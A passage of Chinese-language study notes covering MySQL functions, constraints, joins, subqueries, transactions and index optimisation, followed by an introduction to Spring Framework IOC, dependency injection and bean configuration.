| substring_index(str,delim,count) | 函数用来截取字符串,str:要处理的字符串  delim:分隔符   count:计数  如果count是正数，那么就是从左往右数，第N个分隔符的左边的全部内容相反，如果是负数，那么就是从右边开始数，第N个分隔符右边的所有内容， |

代码如下

```sql
-- 拼接
SELECT CONCAT('Hello', 'World');
-- 小写
SELECT LOWER('Hello');
-- 大写
SELECT UPPER('Hello');
-- 左填充
SELECT LPAD('01', 5, '-');
-- 右填充
SELECT RPAD('01', 5, '-');
-- 去除空格
SELECT TRIM(' Hello World ');
-- 切片（起始索引为1）
SELECT SUBSTRING('Hello World', 1, 5);
```

#### 4.2 数值函数

| 函数        | 功能                             |
| :---------- | :------------------------------- |
| CEIL(x)     | 向上取整                         |
| FLOOR(x)    | 向下取整                         |
| MOD(x, y)   | 返回x/y的模                      |
| RAND()      | 返回0~1内的随机数                |
| ROUND(x, y) | 求参数x的四舍五入值，保留y位小数 |

#### 4.3 日期函数

| 函数                               | 功能                                              |
| :--------------------------------- | :------------------------------------------------ |
| CURDATE()                          | 返回当前日期                                      |
| CURTIME()                          | 返回当前时间                                      |
| NOW()                              | 返回当前日期和时间                                |
| YEAR(date)                         | 获取指定date的年份                                |
| MONTH(date)                        | 获取指定date的月份                                |
| DAY(date)                          | 获取指定date的日期                                |
| DATE_ADD(date, INTERVAL expr type) | 返回一个日期/时间值加上一个时间间隔expr后的时间值 |
| DATEDIFF(date1, date2)             | 返回起始时间date1和结束时间date2之间的天数        |

代码如下

```sql
-- DATE_ADD
SELECT DATE_ADD(NOW(), INTERVAL 70 YEAR);
```

#### 4.4 流程函数

| 函数                                                         | 功能                                                    |
| :----------------------------------------------------------- | :------------------------------------------------------ |
| IF(value, t, f)                                              | 如果value为true，则返回t，否则返回f                     |
| IFNULL(value1, value2)                                       | 如果value1不为空，返回value1，否则返回value2            |
| CASE WHEN [ val1 ] THEN [ res1 ] … ELSE [ default ] END      | 如果val1为true，返回res1，… 否则返回default默认值       |
| CASE [ expr ] WHEN [ val1 ] THEN [ res1 ] … ELSE [ default ] END | 如果expr的值等于val1，返回res1，… 否则返回default默认值 |

```sql
select
    name,
    (case when age > 30 then '中年' else '青年' end)
from employee;
select
    name,
    (case workaddress when '北京市' then '一线城市' when '上海市' then '一线城市' else '二线城市' end) as '工作地址'
from employee;
```



### 5、约束

#### 5.1 概述

1. 概念:约束是作用于表中字段上的规则，用于限制存储在表中的数据。
2. 目的:保证数据库中数据的正确、有效性和完整性。

| 约束                    | 描述                                                     | 关键字      |
| :---------------------- | :------------------------------------------------------- | :---------- |
| 非空约束                | 限制该字段的数据不能为null                               | NOT NULL    |
| 唯一约束                | 保证该字段的所有数据都是唯一、不重复的                   | UNIQUE      |
| 主键约束                | 主键是一行数据的唯一标识，要求非空且唯一                 | PRIMARY KEY |
| 默认约束                | 保存数据时，如果未指定该字段的值，则采用默认值           | DEFAULT     |
| 检查约束（8.0.1版本后） | 保证字段值满足某一个条件                                 | CHECK       |
| 外键约束                | 用来让两张图的数据之间建立连接，保证数据的一致性和完整性 | FOREIGN KEY |

约束是作用于表中字段上的，可以再创建表/修改表的时候添加约束。

#### 5.2 常用约束

| 约束条件 | 关键字         |
| :------- | :------------- |
| 主键     | PRIMARY KEY    |
| 自动增长 | AUTO_INCREMENT |
| 不为空   | NOT NULL       |
| 唯一     | UNIQUE         |
| 逻辑条件 | CHECK          |
| 默认值   | DEFAULT        |

代码如下

```sql
create table user(
    id int primary key auto_increment,
    name varchar(10) not null unique,
    age int check(age > 0 and age < 120),
    status char(1) default '1',
    gender char(1)
);
```

#### 5.3 外键约束

外键用来让两张表的数据之间建立连接，从而保证数据的一致性和完整性。

添加外键：

```sql
CREATE TABLE 表名(
    字段名 字段类型,
    ...
    [CONSTRAINT] [外键名称] FOREIGN KEY(外键字段名) REFERENCES 主表(主表列名)
);
ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段名) REFERENCES 主表(主表列名);
-- 例子
alter table emp add constraint fk_emp_dept_id foreign key(dept_id) references dept(id);
```

删除外键：
`ALTER TABLE 表名 DROP FOREIGN KEY 外键名;`

**删除/更新行为**

| 行为        | 说明                                                         |
| :---------- | :----------------------------------------------------------- |
| NO ACTION   | 当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有则不允许删除/更新（与RESTRICT一致） |
| RESTRICT    | 当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有则不允许删除/更新（与NO ACTION一致） |
| CASCADE     | 当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有则也删除/更新外键在子表中的记录 |
| SET NULL    | 当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有则设置子表中该外键值为null（要求该外键允许为null） |
| SET DEFAULT | 父表有变更时，子表将外键设为一个默认值（Innodb不支持）       |

更改删除/更新行为：
`ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名(主表字段名) ON UPDATE 行为 ON DELETE 行为;`



### 6、多表查询

#### 6.1 多表关系

##### 一对多

案例：部门与员工

关系：一个部门对应多个员工，一个员工对应一个部门

实现：==在多的一方建立外键，指向一的一方的主键==

##### 多对多

案例：学生与课程

关系：一个学生可以选多门课程，一门课程也可以供多个学生选修

实现：==建立第三张中间表，中间表至少包含两个外键，分别关联两方主键==

##### 一对一

案例：用户与用户详情

关系：一对一关系，多用于单表拆分，将一张表的基础字段放在一张表中，其他详情字段放在另一张表中，以提升操作效率

实现：==在任意一方加入外键，关联另外一方的主键，并且设置外键为唯一的（UNIQUE）==

#### 6.2 查询

概述:指从多张表中查询数据

合并查询（笛卡尔积，会展示所有组合结果）：

`select * from employee, dept;`

> 笛卡尔积：两个集合A集合和B集合的所有组合情况（在多表查询时，需要消除无效的笛卡尔积）

消除无效笛卡尔积：
`select * from employee, dept where employee.dept = dept.id;`

##### 连接查询

**内连接**

内连接查询的是两张表交集的部分

隐式内连接：

`SELECT 字段列表 FROM 表1, 表2 WHERE 条件 ...;`

显式内连接：

`SELECT 字段列表 FROM 表1 [ INNER ] JOIN 表2 ON 连接条件 ...;`

显式性能比隐式高

```sql
-- 查询员工姓名，及关联的部门的名称
-- 隐式
select e.name, d.name from employee as e, dept as d  v
-- 显式
select e.name, d.name from employee as e inner join dept as d on e.dept = d.id;
```



**外连接**

左外连接：

查询左表所有数据，以及两张表交集部分数据

`SELECT 字段列表 FROM 表1 LEFT [ OUTER ] JOIN 表2 ON 条件 ...;`

相当于查询表1的所有数据，包含表1和表2交集部分数据

右外连接：

查询右表所有数据，以及两张表交集部分数据

`SELECT 字段列表 FROM 表1 RIGHT [ OUTER ] JOIN 表2 ON 条件 ...;`

```sql
-- 左
select e.*, d.name from employee as e left outer join dept as d on e.dept = d.id;
select d.name, e.* from dept d left outer join emp e on e.dept = d.id;  -- 这条语句与下面的语句效果一样
-- 右
select d.name, e.* from employee as e right outer join dept as d on e.dept = d.id;
```

左连接可以查询到没有dept的employee，右连接可以查询到没有employee的dept



**自连接**

当前表与自身的连接查询，自连接必须使用表别名

语法：

`SELECT 字段列表 FROM 表A 别名A JOIN 表A 别名B ON 条件 ...;`

自连接查询，可以是内连接查询，也可以是外连接查询

```sql
-- 查询员工及其所属领导的名字
select a.name, b.name from  employee a, employee b where a.manager = b.id;
-- 没有领导的也查询出来
select a.name, b.name from employee a left join employee b on a.manager = b.id;
```

**联合查询**

把多次查询的结果合并，形成一个新的查询集

语法：

```sql
SELECT 字段列表 FROM 表A ...
UNION [ALL]
SELECT 字段列表 FROM 表B ...
```

注意事项

- UNION ALL 会有重复结果，UNION 不会
- 联合查询比使用or效率高，不会使索引失效

##### 子查询

SQL语句中嵌套SELECT语句，称谓嵌套查询，又称子查询。

`SELECT * FROM t1 WHERE column1 = ( SELECT column1 FROM t2);`

**子查询外部的语句可以是 INSERT / UPDATE / DELETE / SELECT 的任何一个**

根据子查询结果可以分为：

- 标量子查询（子查询结果为单个值）
- 列子查询（子查询结果为一列）
- 行子查询（子查询结果为一行）
- 表子查询（子查询结果为多行多列）

根据子查询位置可分为：

- WHERE 之后
- FROM 之后
- SELECT 之后

**标量子查询**

子查询返回的结果是单个值（数字、字符串、日期等）。

常用操作符：= < > > >= < <=

```SQL
-- 查询销售部所有员工
select id from dept where name = '销售部';
-- 根据销售部部门ID，查询员工信息
select * from employee where dept = 4;
-- 合并（子查询）
select * from employee where dept = (select id from dept where name = '销售部');
-- 查询xxx入职之后的员工信息
select * from employee where entrydate > (select entrydate from employee where name = 'xxx');
```

**列子查询**

返回的结果是一列（可以是多行）。

常用操作符：

| 操作符 | 描述                                   |
| :----- | :------------------------------------- |
| IN     | 在指定的集合范围内，多选一             |
| NOT IN | 不在指定的集合范围内                   |
| ANY    | 子查询返回列表中，有任意一个满足即可   |
| SOME   | 与ANY等同，使用SOME的地方都可以使用ANY |
| ALL    | 子查询返回列表的所有值都必须满足       |

```SQL
-- 查询销售部和市场部的所有员工信息
select * from employee where dept in (select id from dept where name = '销售部' or name = '市场部');
-- 查询比财务部所有人工资都高的员工信息
select * from employee where salary > all(select salary from employee where dept = (select id from dept where name = '财务部'));
-- 查询比研发部任意一人工资高的员工信息
select * from employee where salary > any (select salary from employee where dept = (select id from dept where name = '研发部'));
```

**行子查询**

返回的结果是一行（可以是多列）。

常用操作符：=, <, >, IN, NOT IN

```SQL
-- 查询与xxx的薪资及直属领导相同的员工信息
select * from employee where (salary, manager) = (12500, 1);
select * from employee where (salary, manager) = (select salary, manager from employee where name = 'xxx');
```

**表子查询**

返回的结果是多行多列

常用操作符：IN

```SQL
-- 查询与xxx1，xxx2的职位和薪资相同的员工
select * from employee where (job, salary) in (select job, salary from employee where name = 'xxx1' or name = 'xxx2');
-- 查询入职日期是2006-01-01之后的员工，及其部门信息
select e.*, d.* from (select * from employee where entrydate > '2006-01-01') as e left join dept as d on e.dept = d. id;
```



### 7、事务

#### 7.1 基本使用

事务是一组操作的集合，事务会把所有操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。

基本操作：

```sql
-- 1. 查询张三账户余额
select * from account where name = '张三';
-- 2. 将张三账户余额-1000
update account set money = money - 1000 where name = '张三';
-- 此语句出错后张三钱减少但是李四钱没有增加
模拟sql语句错误 
-- 3. 将李四账户余额+1000
update account set money = money + 1000 where name = '李四';
-- 查看事务提交方式
SELECT @@AUTOCOMMIT;
-- 设置事务提交方式，1为自动提交，0为手动提交，该设置只对当前会话有效
SET @@AUTOCOMMIT = 0;
-- 提交事务
COMMIT;
-- 回滚事务
ROLLBACK;
-- 设置手动提交后上面代码改为：
select * from account where name = '张三';
update account set money = money - 1000 where name = '张三';
update account set money = money + 1000 where name = '李四';
commit;
```

操作方式二：

开启事务：
`START TRANSACTION 或 BEGIN TRANSACTION;`
提交事务：
`COMMIT;`
回滚事务：
`ROLLBACK;`

操作实例：

```sql
start transaction;
select * from account where name = '张三';
update account set money = money - 1000 where name = '张三';
update account set money = money + 1000 where name = '李四';
commit;
```

#### 7.2 四大特性ACID

- 原子性(Atomicity)：事务是不可分割的最小操作但愿，要么全部成功，要么全部失败
- 一致性(Consistency)：事务完成时，必须使所有数据都保持一致状态
- 隔离性(Isolation)：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行
- 持久性(Durability)：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的

#### 7.3 并发事务

| 问题       | 描述                                                         |
| :--------- | :----------------------------------------------------------- |
| 脏读       | 一个事务读到另一个事务还没提交的数据                         |
| 不可重复读 | 一个事务先后读取同一条记录，但两次读取的数据不同             |
| 幻读       | 一个事务按照条件查询数据时，没有对应的数据行，但是再插入数据时，又发现这行数据已经存在 |

*这三个问题的详细演示：*https://www.bilibili.com/video/BV1Kr4y1i7ru?p=55cd

并发事务隔离级别：

| 隔离级别              | 脏读 | 不可重复读 | 幻读 |
| :-------------------- | :--- | :--------- | :--- |
| Read uncommitted      | √    | √          | √    |
| Read committed        | ×    | √          | √    |
| Repeatable Read(默认) | ×    | ×          | √    |
| Serializable          | ×    | ×          | ×    |

- √表示在当前隔离级别下该问题会出现
- Serializable 性能最低；Read uncommitted 性能最高，数据安全性最差

查看事务隔离级别：
`SELECT @@TRANSACTION_ISOLATION;`
设置事务隔离级别：
`SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE };`
SESSION 是会话级别，表示只针对当前会话有效，GLOBAL 表示对所有会话有效

### 8、索引

#### 8.1 索引概述

==**介绍**==

索引(index)是帮助MySQL==**高效获取数据**==的==**数据结构**==(有序)。在数据之外，数据库系统还维护着满足特定查找算法的数据结构，这些数据结构以某种方式引用(指向)数据，这样就可以在这些数据结构上实现高级查找算法，这种数据结构就是索引。

![image-20240318185649405](./img/小米虫爬山路-img/image-20240318185649405.png)

上述例子中一个时无age索引，一个时有age索引，当无age时就会全表扫描效率低，当有age索引时数据库会再去维护一个数据结构(可能是树、哈希表等)用于加速查找效率。

==**优缺点**==

![image-20240318190004023](./img/小米虫爬山路-img/image-20240318190004023.png)

#### 8.2 索引结构

MySL的索引是在存储引擎层实现的，不同的存储引警有不同的结构，主要包含以下几种:

常见索引结构:

![image-20240318190202845](./img/小米虫爬山路-img/image-20240318190202845.png)

不同引擎支持的索引:

![image-20240318190239362](./img/小米虫爬山路-img/image-20240318190239362.png)

==**B-Tree(多路平衡查找树)**==

![image-20240318190812953](./img/小米虫爬山路-img/image-20240318190812953.png)

==**B+Tree**==

![image-20240318191313563](./img/小米虫爬山路-img/image-20240318191313563.png)

相对于B-Tree区别:

1. 所有的数据都会出现在叶子节点
2. 叶子节点形成一个单向链表

在mysql中对B+Tree树进行了优化

![image-20240318192355462](./img/小米虫爬山路-img/image-20240318192355462.png)

==**Hash**==

![image-20240318192614093](./img/小米虫爬山路-img/image-20240318192614093.png)

Hash索引特点

1. Hash索引只能用于对等比较(=，in)，不支持范围查询(between，>，<，…)
2. 无法利用索引完成排序操作
3. 查询效率高，通常只需要一次检索就可以了，效率通常要高于B+tree索引

存储引擎支持

在MySQL中，支持hash索引的是Memony引擎，而inoDB中具有自适应hash功能，hash索引是存储引擎根据B+Tree索引在指定条件下自动构建的。

#### 8.3 索引分类

![image-20240318195642626](./img/小米虫爬山路-img/image-20240318195642626.png)

在InnoDB引擎中，根据索引存储的形式，可以分为两种:

![image-20240318195908807](./img/小米虫爬山路-img/image-20240318195908807.png)

 聚集索引选取规则:

1. 如果存在主键，主键索引就是聚集索引。
2. 如果不存在主键，将使用第一个唯一(UNIOUE)索引作为聚集索引。
3. 如果表没有主键，或没有合适的唯一索引，则InnoDB会自动生成一个rowid作为隐藏的聚集索引。

以下实例演示:

![image-20240318200410681](./img/小米虫爬山路-img/image-20240318200410681.png)

上图以id为聚集索引，索引的存储值为一行的数据，而以name为二级索引，索引的存储值为对应的id值。

**回表查询:先从二级索引查询，再从二级索引查询聚集索引。**

#### 8.4 sql性能分析

==**sql执行频率**==

MVSOL客户端连接成功后，通过 show [session|global] status 命令可以提供服务器状态信息。通过如下指令，可以查看当前数据库的INSERT、UPDATE、DELETE、SELECT的访问频次:

```sql
show global status like 'Com_______'
```

==**慢查询日志**==

慢查询日志记录了所有执行时间超过指定参数(long_query_time，单位:秒，默认10秒)的所有SQL语句的日志。

MySQL的慢查询日志默认没有开启，需要在MySQL的配置文件(/etc/my.cnf)中配置如下信息:

查看慢查询是否开启的语句:

```sql
show variables like 'slow_query_log'
```

像开启慢查询日志需要在上述的配置文件中添加如下信息:

```sql
#开启慢查询日志
slow_query_log = 1
#设置慢查询日志的时间为2秒，sql语句执行时间超过2秒的，就会被视为慢查询
long_query_time = 2
```

==**profile详情**==

show profiles 能够在做SQL优化时帮助我们了解时间都耗费到哪里去了。通过have profiling参数，能够看到当前MySQL是否支持

```sql
#查看当前数据库是否支持profiles功能
select @@have_profiling
#查看是否开启profiles功能
select @@profiling
#开启功能
set profiling = 1
#查看每一条SQL的耗时基本情况
show profiles;
#查看指定query id的SQL语句各个阶段的耗时情况
show profile for query query_id,
#查看指定query id的SQL语句CPU的使用情况
show profile cpu for query query_id,
```

==**explain执行计划**==

EXPLAIN 或者 DESC命令获取 MySQL如何执行 SELECT语句的信息，包括在 SELECT 语句执行过程中表如何连接和连接的顺序。

语法:

```sql
#直接在select语句之前加上关键字 explain/desc
EXPLAIN NSELECT 字段列表 FROM 表名 WHERE 条件;
```

EXPLAIN 执行计划各字段含义:

- id

select查询的序列号，表示查询中执行select子句或者是==**操作表**==的顺序(id相同，执行顺序从上到下;id不同，值越大，越先执行)。多表会有多条数据。

- select_type

 表示 SELECT的类型，常见的取值有 SIMPLE(简单表，即不使用表连接或者子查询)、PRIMARY(主查询，即外层的查询)UNION(UNION 中的第二个或者后面的查询语句)、SUBQUERY(SELECT/WHERE之后包含了子查询)等

- type

 表示连接类型，性能由好到差的连接类型为NULL、system、const、eq_ref、ref、range、index、all 

- possible_key

显示可能应用在这张表上的索引，一个或多个

- Key

实际使用的索引，如果为NULL，则没有使用索引。

- Key_len

表示索引中使用的字节数，该值为索引字段最大可能长度，并非实际

用长度，在不损失精确性的前提下，长度越短越好。

- rows

MySQL认为必须要执行查询的行数，在innodb引擎的表中，是一个估

值，可能并不总是准确的。

- filtered

表示返回结果的行数占需读取行数的百分比，filtered 的值越大越好。

#### 8.5 索引使用

==**最左前缀法则**==

如果索引了多列(联合索引)，要遵守最左前缀法则。最左前缀法则指的是查询从索引的最左列开始，并且不跳过索引中的列。如果跳跃某一列，==**索引将部分失效(后面的字段索引失效)。**==

示例:

有如下表索引结构

![image-20240320235631580](./img/小米虫爬山路-img/image-20240320235631580.png)

其中`profession`、`age`、`status`为==**联合索引**==

通过最左前缀法则知:

```sql
explain select * from tb_user where profession = '软件工程' and age = 31 and status = '0'; #会全部走索引
explain select * from tb user where profession = '软件工程' and age = 31 #会全部走索引
explain select* from tb user where profession ='软件工程' #会全部走索引
explain select * from tb user where age = 31 and status ='0', #age和status的索引都会失效
explain select * from tb user where profession ='软件工程' and status ='0'; #status索引会失效profession不会失效
```

==**注意:最左前缀法则，最左边的索引必须存在不然索引全部失效，当最左边存在但是跳了一列后面的索引将不生效，且与书写顺序无关。此法则只对于联合索引有用**==

==**范围查询**==

==**联合索引**==中，出现范围查询(>，<)，范围查询右侧的列索引失效

```sql
explain select * from tb user where profession='软件工程' and age >30 and status ='0'; #此时最后的status会失效，因为前面出现了>,要解决以上问题尽量使用<=或者>=来进行范围查询
explain select * from tb user where profession='软件工程' and age >=30 and status ='0'
```

==**索引失效**==

- 索引列运算

  不要在索引列上进行运算操作，**索引将失效**

```sql
explain select *from tb user where substring(phone,10,2)='15'
```

- 字符串不加引号

  字符串类型字段使用时，不加引号，**索引将失效**

```sql
explain select *from tb user where phone = 123456789
```

- 模糊查询

  如果仅仅是尾部模糊匹配，**索引不会失效**。如果是头部模糊匹配，**索引失效**。

```sql
explain select * from tb_user  where profession like  '软件%';   #会走索引
explain select * from tb_user  where profession like  '%工程';   #不会走索引
```

- or连接的条件

  用or分割开的条件，如果or前的条件中的列有索引，而后面的列中没有索引，那么涉及的索引都不会被用到。

```sql
explain select * from tb_user where id = 10 or age = 23,
explain select * from tb_userwhere phone ='17799990017' or age = 23
```

由于age没有索引，所以即使id、phone有索引，索引也会失效。所以需要针对于age也要建立索引。

- 数据分布影响

  如果MySQL评估使用索引此全表更慢，则不使用索引。

```sql
explain select * from tb user where phone >='17799990005'
explain select * from tb user where phone >='17799990015'
```

==**sql提示**==

SQL提示，是优化数据库的一个重要手段，简单来说，就是在SQL语句中加入一些人为的提示来达到优化操作的目的。

```sql
#use index 使用
explain select * from tb_user use index(idx user pro) where profession='软件工程'
#ignore index 忽视
explain select * from tb_user ignore index(idx user pro) where profession='软件工程”
#force index 强制使用
explain select * from tb_user force index(idx user pro) where profession='软件工程
```

==**覆盖索引**==

尽量使用覆盖索引(查询使用了索引，并且需要返回的列，在该索引中已经全部能够找到)，减少select *。

```sql
explain select id, profession from tb_user where profession = '软件工程' and age = 31 and status = '0' #性能高
explain select id,profession,age, status from tb_user where profession = '软件工程' and age =31 and status = '0';#性能高
explain select id,profession,age, status, name from tb_user where profession = '软件工程' and age = 31 and status= '0';#性能低
explain select * from tb_user where profession = '软件工程' and age= 31 and status='0';#性能低
```

在执行select * 或者查找是出现在select后面的但是未出现在where后面的会进行回表查询。

==**前缀索引**==

当字段类型为字符串(varchar，text等)时，有时候需要索引很长的字符串，这会让索引变得很大，查询时，浪费大量的磁盘IO，影响查询效率。此时可以只将字符串的==**一部分前缀，建立索引**==，这样可以大大节约索引空间，从而提高索引效率。

**前缀长度**:可以根据索引的选择性来决定，而选择性是指不重复的索引值(基数)和数据表的记录总数的比值，索引选择性越高则查询效率越高唯一索引的选择性是1，这是最好的索引选择性，性能也是最好的。

求取某个字段的选择性

```sql
select count(distinct email)/count(*) from tb_user  #求取tb_user这个表中email的选择性
select count(distinct substring(email,1,5))/count(*) from tb_user   #求取tb_user这个表中email前5个字符的选择性
```

**创建前缀索引**:

```sql
create index idx_email_5 on tb_user(email(5))  #创建email的前5个字符的索引
```



## 八、Spring

### 1、 Spring介绍

官网：https://spring.io，从官网我们可以大概了解到：

* Spring能做什么:用以开发web、微服务以及分布式系统等,光这三块就已经占了JavaEE开发的九成多。
* Spring并不是单一的一个技术，而是一个大家族，可以从官网的`Projects`中查看其包含的所有技术。

![image-20230803201607878](./img/小米虫爬山路-img/image-20230803201607878.png)

在Spring中我们要重点学习以上三种：

* Spring Framework:Spring框架，是Spring中最早最核心的技术，也是所有其他技术的基础。
* SpringBoot:Spring是来简化开发，而SpringBoot是来帮助Spring在简化的基础上能更快速进行开发。
* SpringCloud:这个是用来做分布式之微服务架构的相关开发。

我们今天所学习的Spring其实指的是==Spring Framework==。

随着时间推移，版本不断更新维护，目前最新的是Spring5

* Spring1.0是纯配置文件开发
* Spring2.0为了简化开发引入了注解开发，此时是配置文件加注解的开发方式
* Spring3.0已经可以进行纯注解开发，使开发效率大幅提升，我们的课程会以注解开发为主
* Spring4.0根据JDK的版本升级对个别API进行了调整
* Spring5.0已经全面支持JDK8，现在Spring最新的是5系列所以建议大家把JDK安装成1.8版

### 2、Spring系统架构

Spring Framework是Spring生态圈中最基础的项目，是其他项目的根基。

![image-20230803202157311](./img/小米虫爬山路-img/image-20230803202157311.png)

(1)核心层

* Core Container:核心容器，这个模块是Spring最核心的模块，其他的都需要依赖该模块，对于java中装对象

(2)AOP层

* AOP:面向切面编程，它依赖核心层容器，目的是==在不改变原有代码的前提下对其进行功能增强==
* Aspects:AOP是思想,Aspects是对AOP思想的具体实现

(3)数据层

* Data Access:数据访问，Spring全家桶中有对数据访问的具体实现技术
* Data Integration:数据集成，Spring支持整合其他的数据层解决方案，比如Mybatis
* Transactions:事务，Spring中事务管理是Spring AOP的一个具体实现，也是后期学习的重点内容

(4)Web层

* 这一层的内容将在SpringMVC框架具体学习

(5)Test层

* Spring主要整合了Junit来完成单元测试和集成测试



学习路线：

![image-20230803202526240](./img/小米虫爬山路-img/image-20230803202526240.png)

### 3、Spring核心概念

在Spring核心概念这部分内容中主要包含`IOC/DI`、`IOC容器`和`Bean`,那么问题就来了，这些都是什么呢?

####  3.1 IOC、IOC容器

==IOC（Inversion of Control）控制反转==：使用对象时，在程序中不要主动使用new产生对象，转换为由==外部==提供对象，此过程中对象创建控制权由程序转移到外部，此思想称为==**控制反转**==。



Spring和IOC之间的关系是什么呢?

* Spring技术对IOC思想进行了实现
* Spring提供了一个容器，称为==IOC容器==，用来充当IOC思想中的"外部"
* IOC思想中的`别人[外部]`指的就是Spring的IOC容器



IOC容器的作用以及内部存放的是什么?

* IOC容器负责对象的创建、初始化等一系列工作，其中包含了数据层和业务层的类对象
* 被创建或被管理的对象在IOC容器中统称为==Bean==
* IOC容器中放的就是一个个的Bean对象



当IOC容器中创建好service和dao对象后，程序能正确执行么?

* 不行，因为service运行需要依赖dao对象
* IOC容器中虽然有service和dao对象
* 但是service对象和dao对象没有任何关系
* 需要把dao对象交给service,也就是说要绑定service和dao对象之间的关系

像这种在容器中建立对象与对象之间的绑定关系就要用到DI:

#### 3.2 DI依赖注入

![image-20230803204123170](./img/小米虫爬山路-img/image-20230803204123170.png)

==DI（Dependency Injection）依赖注入==：在容器中建立bean与bean之间的依赖关系的整个过程，称为依赖注入

* 业务层要用数据层的类对象，以前是自己`new`的
* 现在自己不new了，靠`别人[外部其实指的就是IOC容器]`来给注入进来
* 这种思想就是依赖注入

==**小结：**==

介绍完Spring的IOC和DI的概念后，我们会发现这两个概念的最终目标就是:==充分解耦==，具体实现靠:

* 使用IOC容器管理bean（IOC)
* 在IOC容器内将有依赖关系的bean进行关系绑定（DI）
* 最终结果为:使用对象时不仅可以直接从IOC容器中获取，并且获取到的bean已经绑定了所有的依赖关系.

### 4、IOC基础

通过前面两个案例，我们已经学习了`bean如何定义配置`，`DI如何定义配置`以及`容器对象如何获取`的内容，接下来主要是把这三块内容展开进行详细的讲解，深入的学习下这三部分的内容，首先是bean基础配置。

#### 4.1 bean基础配置

对于bean的基础配置，在前面的案例中已经使用过:

```
<bean id="" class=""/>
```

其中，bean标签的功能、使用方式以及id和class属性的作用，我们通过一张图来描述下

![image-20230803210312734](./img/小米虫爬山路-img/image-20230803210312734.png)

这其中需要大家重点掌握的是:==bean标签的id和class属性的使用==。



##### 4.1.1 name属性

name属性允许bean配置别名。

![image-20230803210808484](./img/小米虫爬山路-img/image-20230803210808484.png)

步骤1：配置别名

打开spring的配置文件applicationContext.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <!--name:为bean指定别名，别名可以有多个，使用逗号，分号，空格进行分隔-->
    <bean id="bookService" name="service service4 bookEbi" class="com.itheima.service.impl.BookServiceImpl">
        <property name="bookDao" ref="bookDao"/>
    </bean>

    <!--scope：为bean设置作用范围，可选值为单例singloton，非单例prototype-->
    <bean id="bookDao" name="dao" class="com.itheima.dao.impl.BookDaoImpl"/>
</beans>
```

**说明:Ebi全称Enterprise Business Interface，翻译为企业业务接口**

##### 4.2.2 bean作用范围scope配置

关于bean的作用范围是bean属性配置的一个==重点==内容。

看到这个作用范围，我们就得思考bean的作用范围是来控制bean哪块内容的?

我们先来看下`bean作用范围的配置属性`:

![image-20230803211003622](./img/小米虫爬山路-img/image-20230803211003622.png)

单例：就是多次调用方法的到IOC容器中的bean，返回的bean都是地址相同的同一个对象。

非单例：就是返回的是地址不同的对象。

默认scope的配置是singleton，要是想非单例就需要配置scopep为prototype

#### 4.2 bean的实例化

* bean是如何创建的
* 实例化bean的三种方式，`构造方法`,`静态工厂`和`实例工厂`

在讲解这三种创建方式之前，我们需要先确认一件事:

bean本质上就是对象，对象在new的时候会使用构造方法完成，那创建bean也是使用构造方法完成的。

##### 4.2.1 构造方法实例化

Spring的bean创建对象可以通过==无参==构造方法。

==注意：无参构造方法如果不存在，将抛出异常BeanCreationException==

使用构造方法实例化bean只需要为类准备好无参的构造方法

##### 4.2.2 静态工厂实例化

使用静态工厂实例化对象，就是用一个类的一个静态方法来返回一个对象如下：

```java
//静态工厂创建对象
public class OrderDaoFactory {
    public static OrderDao getOrderDao(){
        return new OrderDaoImpl();
    }
}
```

配置文件要注意

```java
<bean id="orderDao" class="com.itheima.factory.OrderDaoFactory" factory-method="getOrderDao"/>
```

==class:工厂类的类全名==

==factory-mehod:具体工厂类中创建对象的方法名==

![image-20230804092841712](./img/小米虫爬山路-img/image-20230804092841712.png)

##### 4.2.3 实例工厂与FactoryBean

使用实例化工厂实例化bean，与静态工厂不同的是，不再是使用静态方法来创建实例化对象类，而是要创建工厂对象，再来调用方法来创建想要的对象。

```java
//使用实例化工厂来创建bean对象
public class UserDaoFactory {
    public UserDao getUserDao(){
        return new UserDaoImpl();
    }
}
```

在spring的配置文件中添加以下内容:

```xml
<bean id="userFactory" class="com.itheima.factory.UserDaoFactory"/>//先配置工厂bean
<bean id="userDao" factory-method="getUserDao" factory-bean="userFactory"/>//在从工厂中获得bean
```

实例工厂实例化的方式就已经介绍完了，配置的过程还是比较复杂，**所以Spring为了简化这种配置方式**就提供了一种叫`FactoryBean`的方式来简化开发。

 使用`FactoryBean`就是使用官方给我们提供好的接口来写工厂类

```java
public class UserDaoFactoryBean implements FactoryBean<UserDao> {
    //代替原始实例工厂中创建对象的方法
    public UserDao getObject() throws Exception {
        return new UserDaoImpl();
    }
    //返回所创建类的Class对象
    public Class<?> getObjectType() {
        return UserDao.class;
    }
}
```

这样的配置文件就会简化很多

```xml
<bean id="userDao" class="com.itheima.factory.UserDaoFactoryBean"/>
<!--class传入的是工厂类-->
```

查看源码会发现，FactoryBean接口其实会有三个方法，分别是:

```java
T getObject() throws Exception;//方法一:getObject()，被重写后，在方法中进行对象的创建并返回

Class<?> getObjectType();//方法二:getObjectType(),被重写后，主要返回的是被创建类的Class对象

default boolean isSingleton() {//方法三:没有被重写，因为它已经给了默认值，从方法名中可以看出其作用是设置对象是否为单例，默认true，从意思上来看，我们猜想默认应该是单例，如何来验证呢?思路很简单，就是从容器中获取该对象的多个值，打印到控制台，查看是否为同一个对象。

		return true;
}
```

#### 4.3 bean的生命周期

关于bean的相关知识还有最后一个是`bean的生命周期`,对于生命周期，我们主要围绕着`bean生命周期控制`来讲解:

* 首先理解下什么是生命周期?
  * 从创建到消亡的完整过程,例如人从出生到死亡的整个过程就是一个生命周期。
* bean生命周期是什么?
  * bean对象从创建到销毁的整体过程。
